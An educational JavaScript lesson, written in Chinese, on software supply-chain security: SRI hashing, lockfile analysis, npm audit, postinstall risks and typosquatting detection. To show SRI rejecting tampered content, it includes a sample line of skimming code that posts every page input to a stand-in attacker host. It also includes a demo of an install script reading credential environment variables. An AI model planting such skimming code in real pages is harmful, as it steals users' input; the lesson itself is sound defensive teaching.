/**
 * ============================================================================
 * 知识点：供应链与第三方脚本安全 —— SRI、lockfile、npm audit、postinstall 风险
 * ============================================================================
 *
 * 【所属分类】32_security_and_best_practices —— 安全与最佳实践
 * 【难度等级】进阶
 * 【前置知识】32_security_and_best_practices/01_input_validation.js
 *
 * 【知识点说明】
 *
 * 1. 是什么
 *    软件供应链安全指的是：**你自己写的代码只占最终运行代码的一小部分**，
 *    剩下的大部分来自第三方 —— npm 上的依赖包、CDN 上的脚本、CI 里的构建工具。
 *    攻击者不必攻破你的代码，只要污染你依赖的某一环，就能在你的生产环境里执行代码。
 *
 *    两条主要链路：
 *      (a) **前端脚本链路**：你的 HTML 里写着
 *          `<script src="https://cdn.example.com/lib.js">`。
 *          这一行等于声明"我无条件信任 cdn.example.com 在任何时刻返回的任何内容"。
 *          防御手段是 SRI（Subresource Integrity）。
 *      (b) **依赖包链路**：package.json 里写着 `"lodash": "^4.17.21"`，
 *          安装时会从 registry 拉取（可能是别人的）代码，并可能执行它的安装脚本。
 *          防御手段是 lockfile + audit + 最小依赖 + 安装脚本管控。
 *
 * 2. 为什么需要（真实攻击场景）
 *    (a) **CDN 被入侵 / 被劫持**：历史上多次发生 CDN 上的热门 JS 库被替换成
 *        窃取信用卡信息的版本。没有 SRI 时，你的用户浏览器的行为与你自己挂马完全一样。
 *    (b) **npm 包投毒**：常见手法有
 *        - typosquatting（抢注相似包名，如 `cross-env` → `crossenv`、`lodash` → `lodahs`）；
 *        - 维护者账号被钓鱼接管后发布恶意版本（如 ua-parser-js、event-stream 事件）；
 *        - 恶意版本专偷环境变量里的 CI Token / npm Token / AWS 凭证；
 *        - 作者主动"抗议性破坏"（colors / faker 事件，把包改成死循环）；
 *        - `postinstall` 脚本在 `npm install` 时自动执行 —— 这是最容易被忽略的执行入口。
 *    (c) **传递依赖**：你只装了 10 个包，实际可能装了 300 个包。
 *        任何一个被投毒都会进入你的构建产物。依赖数量 ≈ 攻击面大小。
 *    (d) **lockfile 不一致**：开发机上跑得好好的，CI 上装了不同的版本 ——
 *        可能就是那个被投毒的版本。
 *
 * 3. 核心语法要点
 *
 *    (1) SRI（Subresource Integrity）
 *        HTML 写法：
 *          <script src="https://cdn.example.com/lib.js"
 *                  integrity="sha384-<base64 哈希>"
 *                  crossorigin="anonymous"></script>
 *        规则细节：
 *          - 只支持 sha256 / sha384 / sha512；**sha384 是社区约定俗成的推荐值**。
 *            （md5/sha1 已不安全，不允许用于 SRI。）
 *          - `integrity` 里可以写多个哈希（空格分隔），浏览器任意一个匹配即通过
 *            —— 用于滚动升级。
 *          - 跨域脚本必须带 `crossorigin="anonymous"`（否则响应不是 CORS 成功的，
 *            浏览器拿不到内容就没办法校验完整性）。
 *          - 校验失败时脚本**不执行**，并触发 `onerror`。
 *          - SRI 只保证"内容没被篡改"，**不保证内容本身是安全的** ——
 *            如果 CDN 第一次给你的就是恶意文件，你签的哈希也是恶意的。
 *
 *    (2) lockfile（package-lock.json / yarn.lock / pnpm-lock.yaml）
 *        - 作用：把**整棵依赖树**的精确版本 + 下载地址 + 完整性哈希固定下来。
 *        - `npm ci` 与 `npm install` 的区别：
 *            `npm install` 允许按 semver 范围升级并改写 lockfile；
 *            `npm ci` **严格按 lockfile 安装**，lockfile 与 package.json 不一致时直接报错。
 *          **CI / 生产构建必须用 `npm ci`**，这样才能得到可复现的安装。
 *        - 每个条目里的 `integrity` 是 npm 自己的 SRI（对 tarball 的哈希），
 *          registry 返回的内容若与 lockfile 不符，安装会失败。
 *        - lockfile 必须提交进版本库，并且**代码评审时留意它的 diff**：
 *          一个正常的业务改动不应该顺带升级几十个包。
 *
 *    (3) npm audit
 *        - `npm audit`：对照 GitHub Advisory 数据库检查已知漏洞，输出报告。
 *        - `npm audit --omit=dev`：只看生产依赖（开发依赖漏洞影响面通常小得多）。
 *        - `npm audit fix`：自动升级到兼容的修复版本；
 *          `npm audit fix --force` 可能引入破坏性升级，**不要无脑跑**。
 *        - `npm audit --json`：机器可读，适合接入 CI 做门禁。
 *        - **局限性（必须知道）**：
 *            · 只覆盖"已公开披露并进了数据库"的漏洞 —— 0day 与私有投毒查不出来；
 *            · 大量告警来自开发依赖与间接依赖，噪音高，容易被团队无视（"告警疲劳"）；
 *            · 告警 ≠ 可利用：你的代码可能根本没走到那个有问题的函数；
 *            · 需要联网访问 registry 与 advisory 服务（本文件**不联网**，只讲用法）。
 *
 *    (4) postinstall 脚本的风险
 *        package.json 里的 `postinstall` / `preinstall` / `install` 脚本会在
 *        `npm install` 时**自动执行**，且**默认拥有与你相同的权限**：
 *        能读写文件、读环境变量、发网络请求。
 *        对策：
 *          - `npm ci --ignore-scripts` 或全局配置 `ignore-scripts=true`
 *            （代价：有些包需要编译原生模块，确实依赖安装脚本）；
 *          - 使用 `--ignore-scripts` 后，把必须跑构建的包单独用白名单处理；
 *          - 在容器 / CI 的受限环境里安装（无生产凭证、无内网访问、只读文件系统）。
 *
 *    (5) 依赖数量与攻击面的关系
 *        攻击面 ≈ 你能容忍的"别人写的代码"总量。要主动做的减法：
 *          - 能用 30 行实现的工具函数，不要为了它引入一个 5 层依赖的包；
 *          - 定期用 `npm ls <pkg>` / `npm why <pkg>` 查清"这个包是谁引入的"；
 *          - 用 `overrides` / `resolutions` 收敛重复版本；
 *          - 关注依赖的依赖 —— 你引以为傲的"只装了 3 个包"，可能是 200 个包。
 *
 *    (6) 如何评估一个依赖是否可信（清单见本文件小节 6）
 *        下载量趋势、维护者数量与活跃度、最近发布时间、仓库地址是否真实存在、
 *        是否有安装脚本、依赖数量、是否有 provenance/attestation 签名、
 *        维护者是否开了 2FA、发布是否有签名。
 *
 * 4. 常见陷阱
 *    - `integrity` 属性写对了，却忘了 `crossorigin="anonymous"` → 校验静默失效。
 *    - 用 `^` / `~` / `latest` 引入 CDN 脚本（CDN 的 URL 里通常带版本号，别用 latest）。
 *    - 只锁 `dependencies` 的版本，却不提交 lockfile → 传递依赖每次都可能变。
 *    - CI 里用 `npm install` 而不是 `npm ci` → 可复现性丧失，锁文件被悄悄改写。
 *    - 把 `npm audit` 的"0 vulnerabilities"当成"绝对安全"（它只是"没查到已知漏洞"）。
 *    - 在 CI 里 `npm install` 且环境变量里有部署密钥 → 一个恶意 postinstall 就能偷走全部。
 *    - 认为"这个包很流行所以安全"：流行包恰恰是投毒收益最高的目标（ua-parser-js 就是例子）。
 *    - 依赖告警一来就 `audit fix --force`，结果引入破坏性升级，把生产搞挂。
 *
 * 【运行方法】
 *   在仓库根目录执行：node 32_security_and_best_practices/14_supply_chain_security.js
 *
 * 【预期输出】
 *   用内存里的"正版 / 被篡改版"脚本演示 SRI 校验的通过与失败；
 *   真实读取本仓库的 package-lock.json 做依赖树分析（依赖总数、传递依赖、安装脚本、
 *   完整性哈希覆盖率、下载来源分布），并演示相似包名（typosquatting）检测；
 *   全程不执行 npm、不联网、不安装任何东西，退出码 0。
 * ============================================================================
 */

import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

// ============================================================================
// 小节 1：为什么第三方脚本是信任边界
// ============================================================================
console.log('--- 1. 第三方脚本是一个信任边界 ---');
console.log('  你的 HTML 里写：');
console.log('    <script src="https://cdn.example.com/lib.js"></script>');
console.log('  这一行的真实含义是：');
console.log('    "我无条件信任 cdn.example.com 在【任何时刻】返回的【任何内容】。"');
console.log('  它和你自己写一段 <script>偷 cookie</script> 的执行效果完全一致 ——');
console.log('  因为对浏览器来说，这段代码就是你的页面的一部分。');
console.log('  历史上多次出现 CDN 被入侵、热门库被替换成窃取支付信息的版本的事件。');
console.log('  防御的起点就是 SRI：给这段内容"签个哈希"。');

// ============================================================================
// 小节 2：SRI —— 用哈希锁定第三方脚本
// ============================================================================
console.log('\n--- 2. SRI：Subresource Integrity 的工作原理 ---');

/** 假装这是 CDN 上的正版库文件内容（内存字符串，没有真的下载任何东西） */
const cdnScriptLegit = [
  '/* awesome-lib v1.2.3 (正版) */',
  'export function fmt(n) { return String(n).padStart(2, "0"); }',
].join('\n');

/** 被入侵的 CDN 返回的内容：多了一行把用户输入发到攻击者服务器的代码 */
const cdnScriptTampered = [
  '/* awesome-lib v1.2.3 (被篡改) */',
  'export function fmt(n) { return String(n).padStart(2, "0"); }',
  // 这一行就是攻击的全部：读取页面上的表单并外发
  'document.querySelectorAll("input").forEach((el) => fetch("https://evil.example/collect", { method: "POST", body: el.value }));',
].join('\n');

/**
 * 计算 SRI 哈希。SRI 只允许 sha256 / sha384 / sha512（不允许 md5/sha1）。
 * @param {string} content
 * @param {'sha256'|'sha384'|'sha512'} [algo]
 * @returns {string} 形如 'sha384-<base64>'
 */
function sriHash(content, algo = 'sha384') {
  if (!['sha256', 'sha384', 'sha512'].includes(algo)) {
    throw new Error(`SRI 不支持 ${algo}（只允许 sha256/sha384/sha512）`);
  }
  return `${algo}-${crypto.createHash(algo).update(content, 'utf8').digest('base64')}`;
}

/**
 * 模拟浏览器对 SRI 的校验。
 * 规范要点：integrity 里可以写多个哈希（空格分隔），命中任意一个即通过。
 * @param {string} content 实际收到的资源内容
 * @param {string} integrityAttr integrity 属性值
 * @returns {{ok:boolean, reason:string}}
 */
function verifySri(content, integrityAttr) {
  const tokens = String(integrityAttr).trim().split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return { ok: false, reason: 'integrity 为空' };
  for (const token of tokens) {
    const dash = token.indexOf('-');
    const algo = token.slice(0, dash);
    if (!['sha256', 'sha384', 'sha512'].includes(algo)) {
      // 规范要求：不认识的算法要忽略这一项（而不是当成通过）
      continue;
    }
    if (sriHash(content, algo) === token) {
      return { ok: true, reason: `命中 ${algo} 哈希` };
    }
  }
  return { ok: false, reason: '所有哈希都不匹配（内容已被篡改）' };
}

const legitHash = sriHash(cdnScriptLegit);
console.log(`  正版脚本的 SRI 哈希：${legitHash}`);
console.log('\n  你应该在 HTML 里这样写：');
console.log(`    <script src="https://cdn.example.com/awesome-lib@1.2.3.js"`);
console.log(`            integrity="${legitHash}"`);
console.log('            crossorigin="anonymous"></script>');
console.log('  三个必须同时具备的要素：');
console.log('    1) integrity  —— 哈希值');
console.log('    2) crossorigin="anonymous" —— 跨域脚本必须带，否则浏览器拿不到响应内容，校验会失效');
console.log('    3) URL 里带精确版本号（不要用 latest / 不固定版本）');

console.log('\n  浏览器视角的三种情况：');
for (const [label, content, attr] of [
  ['① CDN 返回正版内容', cdnScriptLegit, legitHash],
  ['② CDN 被入侵，返回被篡改的内容', cdnScriptTampered, legitHash],
  ['③ 滚动升级：integrity 里同时写了新旧两个哈希', cdnScriptTampered, `${legitHash} ${sriHash(cdnScriptTampered)}`],
]) {
  const r = verifySri(content, attr);
  console.log(`    ${r.ok ? '执行脚本' : '拒绝执行'} <- ${label}`);
  console.log(`        ${r.reason}`);
}
console.log('\n  注意第 ③ 种：多哈希是为了平滑升级，但它同时也意味着"你明确同意了这个新内容"。');
console.log('  生产环境不应该长期留着旧哈希 —— 那等于留了一个永久后门。');

console.log('\n  SRI 的边界（重要）：');
console.log('    ✓ 能防：CDN 内容在"你签发哈希之后"被替换（中间人、CDN 被入侵、缓存投毒）。');
console.log('    ✗ 不能防：CDN 给你的第一次内容就是恶意的（你签的哈希本身来自恶意内容）。');
console.log('    ✗ 不能防：脚本运行时从别处动态加载的子资源（那需要 CSP + strict-dynamic，见 13 篇）。');
console.log('    ✗ 不适用于 JSON 接口 / 图片等非脚本资源（SRI 只对 script / link 生效）。');

// ============================================================================
// 小节 3：真实分析本仓库的 lockfile
// ============================================================================
console.log('\n--- 3. lockfile 分析（真实读取本仓库的 package-lock.json） ---');
console.log('  lockfile 的作用：把整棵依赖树的【精确版本 + 下载地址 + 完整性哈希】固定下来。');
console.log('  没有它 → 每台机器、每次构建装到的传递依赖都可能不同 → 不可复现，也无法审计。');
console.log('  有它   → 只要提交进版本库并用 `npm ci` 安装，任何机器得到完全相同的依赖树。');

const lockPath = path.join(ROOT, 'package-lock.json');
let lockAnalysis = null;
try {
  const lock = JSON.parse(fs.readFileSync(lockPath, 'utf8'));
  const packages = lock.packages ?? {};
  const entries = Object.entries(packages).filter(([name]) => name !== '');

  const withIntegrity = entries.filter(([, meta]) => meta.integrity);
  const withInstallScript = entries.filter(([, meta]) => meta.hasInstallScript);
  const noResolved = entries.filter(([, meta]) => !meta.resolved && !meta.link);

  /** 统计每个下载来源（registry / git / tarball URL）各有多少个包 */
  const hosts = new Map();
  for (const [, meta] of entries) {
    if (!meta.resolved) continue;
    let host = '(非 URL)';
    try {
      host = new URL(meta.resolved).host;
    } catch {
      host = '(非 URL 形式，可能是 git 或本地路径)';
    }
    hosts.set(host, (hosts.get(host) || 0) + 1);
  }

  /** 统计依赖树深度：node_modules/a/node_modules/b 的层级 */
  const depthOf = (name) => (name.match(/node_modules\//g) || []).length;
  const maxDepth = entries.reduce((m, [name]) => Math.max(m, depthOf(name)), 0);
  // 注意：npm 会把绝大多数包"提升（hoist）"到顶层 node_modules，
  // 所以"顶层条目数"远大于 package.json 里真正写下的直接依赖数。
  const hoistedCount = entries.filter(([name]) => depthOf(name) === 1).length;

  /** 从 package.json 读真正的"直接依赖"数量 */
  let directCount = 0;
  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(ROOT, 'package.json'), 'utf8'));
    directCount = Object.keys(pkg.dependencies ?? {}).length + Object.keys(pkg.devDependencies ?? {}).length;
  } catch {
    directCount = 0;
  }

  lockAnalysis = {
    lockfileVersion: lock.lockfileVersion,
    total: entries.length,
    directCount,
    hoistedCount,
    transitiveCount: Math.max(0, entries.length - directCount),
    withIntegrity: withIntegrity.length,
    withoutIntegrity: noResolved.length,
    installScripts: withInstallScript.map(([name, meta]) => ({
      name: name.replace(/^node_modules\//, ''),
      version: meta.version,
    })),
    maxDepth,
    hosts: [...hosts.entries()].sort((a, b) => b[1] - a[1]),
    overrides: lock.overrides ? Object.keys(lock.overrides) : [],
  };
} catch (err) {
  // 演示代码也可能遇到"文件不存在 / 解析失败"——这里必须自己兜住，不能让进程崩掉
  console.log(`  读取 lockfile 失败（这在演示里也算一种常见情况）：${err.message}`);
  console.log('  真实项目里，lockfile 缺失本身就是供应链风险：无法复现安装、无法审计依赖。');
}

if (lockAnalysis) {
  const a = lockAnalysis;
  console.log(`\n  lockfileVersion：${a.lockfileVersion}（v2/v3 才有 packages 字段，粒度更细）`);
  console.log(`  依赖条目总数　：${a.total}（lockfile 里记录的所有包，不含根项目本身）`);
  console.log(`  直接声明依赖　：${a.directCount}（package.json 里 dependencies + devDependencies 的条数）`);
  console.log(`  传递依赖数量　：${a.transitiveCount}  ← 你没直接写、但会一起进入构建产物的包`);
  console.log(`  顶层（已提升）：${a.hoistedCount}  ← npm 会把绝大多数包提升到顶层 node_modules，`);
  console.log('                    所以"node_modules 里有多少个目录"远多于你声明的依赖数');
  console.log(`  依赖树最大深度：${a.maxDepth} 层（层级越深越难审查，也越容易出现重复版本）`);
  console.log(`\n  攻击面的直观感受：package.json 里只写了 ${a.directCount} 个依赖，`);
  console.log(`  实际引入了 ${a.total} 个包的代码。其中任何一个被投毒，都会进入你的构建产物。`);

  console.log(`\n  完整性哈希（integrity）覆盖率：${a.withIntegrity}/${a.total}`);
  console.log('    这一项就是 npm 自己的 SRI：registry 返回的 tarball 内容与 lockfile 里的哈希');
  console.log('    不一致时，安装会直接失败。它是"下载内容没被掉包"的保证。');
  if (a.withoutIntegrity > 0) {
    console.log(`    ⚠ 有 ${a.withoutIntegrity} 个条目没有 integrity 字段（可能是本地路径或 git 依赖）——`);
    console.log('      这些依赖无法用哈希校验，属于需要人工确认的部分。');
  }

  console.log('\n  下载来源分布：');
  for (const [host, count] of a.hosts) {
    console.log(`    ${String(count).padStart(4)} 个 <- ${host}`);
  }
  console.log('    审计要点：出现非官方 registry（或 git 地址、裸 IP、不常见域名）时，');
  console.log('    必须逐个确认来源可信 —— 这是"依赖混淆"攻击最常见的落脚点。');

  console.log(`\n  带安装脚本（hasInstallScript）的包：${a.installScripts.length} 个`);
  for (const s of a.installScripts) {
    console.log(`    - ${s.name}@${s.version}`);
  }
  console.log('    这些包在 npm install 时【会执行代码】。数量越多，安装阶段的执行风险越大。');
  console.log('    注意：即使这个包本身没问题，它的安装脚本也可能在安装时从网络拉取额外内容。');
}

// ============================================================================
// 小节 4：npm audit / npm ci 的正确用法（只讲，不联网执行）
// ============================================================================
console.log('\n--- 4. npm audit 与 npm ci 的正确用法（本文件不联网执行，只讲命令） ---');
const commands = [
  ['npm ci', 'CI / 生产构建的安装命令：严格按 lockfile 安装，不一致就报错。**永远不要在 CI 里用 npm install**'],
  ['npm ci --omit=dev', '只装生产依赖（部署产物里不该有测试框架和打包器）'],
  ['npm ci --ignore-scripts', '安装时不执行任何包的安装脚本，切断 postinstall 这条执行链'],
  ['npm audit', '对照 advisory 数据库检查已知漏洞（需要联网）'],
  ['npm audit --omit=dev', '只看生产依赖的漏洞，显著降低噪音'],
  ['npm audit --json', '机器可读输出，适合接进 CI 做质量门禁'],
  ['npm audit fix', '在 semver 兼容范围内自动升级修复版本'],
  ['npm audit fix --force', '⚠ 允许破坏性升级，可能直接搞挂项目，不要无脑跑'],
  ['npm ls <pkg> / npm why <pkg>', '查清"这个包是谁引入的"，做依赖收敛时的第一步'],
  ['npm view <pkg> time.modified maintainers', '查看包的最后发布时间与维护者列表'],
  ['npm install --save-exact <pkg>', '精确锁定版本，不用 ^ 范围'],
  ['npm config set ignore-scripts true', '全局关掉安装脚本（有些原生模块会因此装不上，需要按需放行）'],
];
for (const [cmd, note] of commands) {
  console.log(`  $ ${cmd}`);
  console.log(`      ${note}`);
}

console.log('\n  npm audit 的四个局限性（决定了它不能作为唯一防线）：');
console.log('    1) 只覆盖"已公开披露并入库"的漏洞 —— 0day、私有投毒、恶意包（不是漏洞）都查不到；');
console.log('    2) 噪音大：大量告警来自开发依赖与用不到的代码路径，容易导致"告警疲劳"；');
console.log('    3) 告警 ≠ 可利用：你的调用方式可能根本触达不到有问题的函数；');
console.log('    4) 它检查的是"版本号对应的已知问题"，无法判断你装到的这个 tarball 内容是否被改过 ——');
console.log('       这一层由 lockfile 的 integrity 哈希来保证（小节 3 已验证）。');

// ============================================================================
// 小节 5：postinstall 的真实能力（无害演示）
// ============================================================================
console.log('\n--- 5. postinstall 脚本能做什么（无害演示） ---');
console.log('  package.json 里的这一段会在 npm install 时【自动执行】，无需任何确认：');
console.log('    "scripts": { "postinstall": "node scripts/setup.js" }');
console.log('  它的权限 = 你执行 npm install 时的用户权限。可以：');
for (const cap of [
  '读写你项目目录（甚至项目外的文件，如果权限允许）',
  '读取全部环境变量（CI Token、npm Token、云服务凭证常常就在里面）',
  '发起任意网络请求（把读到的内容外发）',
  '起一个常驻进程 / 写入 ~/.npmrc / 修改 shell 启动脚本',
]) {
  console.log(`    - ${cap}`);
}

// 无害演示：起一个子进程，只用来证明"安装脚本能读到环境变量"。
// 我们传入的是【自己编造的假凭证】，子进程只是把它打印出来，不做任何其他事情。
console.log('\n  无害演示：模拟一个 postinstall 子进程，看看它能读到什么');
const fakeEnv = { ...process.env, DEMO_DEPLOY_TOKEN: 'fake-token-for-demo-only' };
try {
  const output = execFileSync(
    process.execPath,
    [
      '-e',
      [
        // 只检查一组"典型 CI 密钥变量名"是否存在 —— 不打印任何真实环境变量的值，
        // 也不遍历真实环境的全部变量名，避免把演示程序所在环境的信息带进输出。
        'const watch = ["DEMO_DEPLOY_TOKEN", "NPM_TOKEN", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "DATABASE_URL"];',
        'const found = watch.filter((k) => process.env[k]);',
        'console.log(JSON.stringify({',
        '  checked: watch.length,',
        '  readable: found,',
        '  demoTokeReadBack: process.env.DEMO_DEPLOY_TOKEN ? "(能读到，是本演示自己设置的假值)" : "(读不到)",',
        '  valuePreview: (process.env.DEMO_DEPLOY_TOKEN || "").replace(/./g, "*"),',
        '}));',
      ].join('\n'),
    ],
    { env: fakeEnv, timeout: 5000, encoding: 'utf8' }
  );
  const parsed = JSON.parse(output.trim());
  console.log(`    子进程检查了 ${parsed.checked} 个典型密钥变量名，其中能读到内容的：${JSON.stringify(parsed.readable)}`);
  console.log(`    对我们自己塞进去的假凭证 ${parsed.demoTokeReadBack}，值形如：${parsed.valuePreview}`);
} catch (err) {
  console.log(`    子进程执行失败（已自行捕获，不影响示例继续）：${err.message}`);
}
console.log('  ↑ 结论：如果 CI 在执行 npm install 的那个 shell 里放了真实部署凭证，');
console.log('    一个恶意的 postinstall 就能把它们全部读走并外发。');
console.log('    防御：CI 里安装依赖的步骤与注入密钥的步骤必须分开；');
console.log('          安装阶段用 --ignore-scripts 或受限容器；密钥只在真正部署时注入。');

// ============================================================================
// 小节 6：typosquatting 与依赖可信度评估
// ============================================================================
console.log('\n--- 6. typosquatting：相似包名投毒 ---');
console.log('  攻击者抢注与热门包极度相似的包名，赌你手滑或复制错：');

/**
 * 计算两个字符串的"编辑距离"，并且把**相邻两个字符互换**也算作一次编辑
 * （即受限的 Damerau-Levenshtein / 最优字符串对齐距离）。
 *
 * 为什么必须包含"互换"这一种？因为 typosquatting 里最常见的手法之一就是
 * 互换相邻字符（lodash → lodahs、axios → axois）。纯 Levenshtein 会把它算成 2，
 * 从而漏报。这是最朴素的实现，仅用于教学（生产环境请用成熟库并配合更多信号）。
 * @param {string} a
 * @param {string} b
 * @returns {number}
 */
function editDistance(a, b) {
  const m = a.length;
  const n = b.length;
  const dp = Array.from({ length: m + 1 }, (_, i) => [i, ...Array(n).fill(0)]);
  for (let j = 0; j <= n; j++) dp[0][j] = j;
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      const cost = a[i - 1] === b[j - 1] ? 0 : 1;
      dp[i][j] = Math.min(dp[i - 1][j] + 1, dp[i][j - 1] + 1, dp[i - 1][j - 1] + cost);
      // 相邻字符互换（transposition）也算一次编辑
      if (i > 1 && j > 1 && a[i - 1] === b[j - 2] && a[i - 2] === b[j - 1]) {
        dp[i][j] = Math.min(dp[i][j], dp[i - 2][j - 2] + 1);
      }
    }
  }
  return dp[m][n];
}

/** 你自己项目里"打算安装"的包名（注意其中有几个是攻击者抢注的相似名） */
const requestedPackages = ['lodash', 'lodahs', 'cross-env', 'crossenv', 'axios', 'axois', 'expres', 'express'];
/** 热门/官方包名作为参照 */
const popularPackages = ['lodash', 'cross-env', 'axios', 'express', 'react', 'vue'];

/**
 * 检查一个包名是否与热门包"极度相似但不是它"（typosquatting 的典型特征）。
 * 真实检测还要结合：下载量远低于原包、维护者是新人、发布时间极短、README 抄袭等信号。
 * @param {string} name
 * @returns {{suspicious:boolean, like?:string, distance?:number}}
 */
function checkTyposquatting(name) {
  for (const pop of popularPackages) {
    if (pop === name) return { suspicious: false };
    const d = editDistance(name, pop);
    // 编辑距离 1：改一个字符 / 少一个字符 / 互换相邻两个字符
    if (d === 1) return { suspicious: true, like: pop, distance: d };
  }
  return { suspicious: false };
}

console.log('\n  逐个体检你要安装的包名：');
for (const name of requestedPackages) {
  const r = checkTyposquatting(name);
  if (r.suspicious) {
    console.log(`    ⚠ ${name} —— 与热门包 "${r.like}" 的编辑距离只有 ${r.distance}，高度疑似 typosquatting！`);
  } else {
    console.log(`    ✓ ${name} —— 未发现相似名风险`);
  }
}
console.log('  历史上的真实案例名（仅作名词了解，不要安装、也绝不建议去搜索下载）：');
console.log('    lodash → lodahs / lodash.js；cross-env → crossenv；');
console.log('    event-stream（被接管后加入窃取钱包的代码）；ua-parser-js（维护者账号被接管);');
console.log('    colors / faker（作者主动破坏，把包改成死循环 / 清空内容）。');
console.log('  防御关键：**包名从官方文档复制，不要凭记忆手敲**；');
console.log('            安装前看一眼下载量级与维护者是否与原包一致。');

console.log('\n  评估一个依赖是否可信的清单：');
const trustChecklist = [
  ['下载量', '周下载量是否与原包/同类包在同一量级？突然出现的"新热门包"要警惕'],
  ['维护者', '维护者数量、账号年龄、是否有 2FA、是否即原作者'],
  ['发布时间', '最近一次发布距今多久？"很久没更新"与"刚刚突然更新"都是信号'],
  ['仓库地址', 'package.json 里的 repository 是否真实存在、和文档一致'],
  ['安装脚本', '是否有 preinstall/install/postinstall？有的话要逐行读它干什么'],
  ['依赖数量', '它自己又依赖了多少包？（依赖的依赖也算你的攻击面）'],
  ['代码体积', '一个"格式化数字"的工具包不该有 500KB 体积'],
  ['provenance', 'npm 上的 provenance / attestation（构建来源可验证签名）是否可用'],
  ['许可证', 'license 字段是否清晰（合规问题，也是"随手发的包"的信号）'],
  ['替代方案', '标准库 / 30 行代码能否替代？能替代就不要引依赖'],
];
for (const [dim, question] of trustChecklist) {
  console.log(`    [ ] ${dim.padEnd(8)} ${question}`);
}

// ============================================================================
// 小节 7：工程层面的供应链加固清单
// ============================================================================
console.log('\n--- 7. 供应链加固清单 ---');
const hardening = [
  ['提交 lockfile', 'package-lock.json 必须进版本库，且评审时关注它的 diff'],
  ['CI 用 npm ci', '严格按 lockfile 安装，保证可复现；不要用 npm install'],
  ['关安装脚本', 'CI/生产用 --ignore-scripts，必要时对个别包放行'],
  ['密钥隔离', 'npm install 与凭证注入分属不同步骤/不同容器'],
  ['最小依赖', '能自己写的 30 行代码就别引包；定期用 npm why 清理'],
  ['版本策略', '关键依赖用精确版本或 overrides 收敛；谨慎使用 latest / ^'],
  ['告警门禁', 'npm audit --omit=dev --json 接入 CI，对高危阻塞合并'],
  ['前端脚本', 'SRI + crossorigin + 精确版本号；能自托管就自托管'],
  ['来源审查', '非官方 registry / git 依赖必须人工确认；考虑私有 registry 做代理与白名单'],
  ['升级节奏', '定期集中升级并跑测试，而不是"出事才升"'],
];
for (const [name, how] of hardening) {
  console.log(`  [ ] ${name.padEnd(10)} ${how}`);
}

// ============================================================================
// 小节 8：小结
// ============================================================================
console.log('\n--- 8. 小结 ---');
console.log('  1) 你的代码只是运行代码的一小部分，其余都来自第三方 —— 那些都是信任边界。');
console.log('  2) SRI 用哈希锁定 CDN 内容，必须配 crossorigin="anonymous" 与精确版本号。');
console.log('  3) SRI 防的是"签发后内容被换"，防不了"第一次给你的就是恶意内容"。');
console.log('  4) lockfile 是可复现安装与依赖审计的基础；CI 必须用 npm ci 而不是 npm install。');
console.log('  5) npm audit 只看已知公开漏洞，噪音大、有盲区，不能当唯一防线。');
console.log('  6) postinstall 是自动执行的代码入口，权限与运行 npm 的用户相同；CI 里要隔离密钥。');
console.log('  7) 依赖数量就是攻击面大小，做减法比做加法更重要。');
console.log('  8) 包名从官方文档复制，不要凭记忆手敲 —— 这是 typosquatting 唯一的可乘之机。');

console.log('\n[结束] 本示例未执行任何 npm 命令、未联网、未安装任何包。退出码 0。');
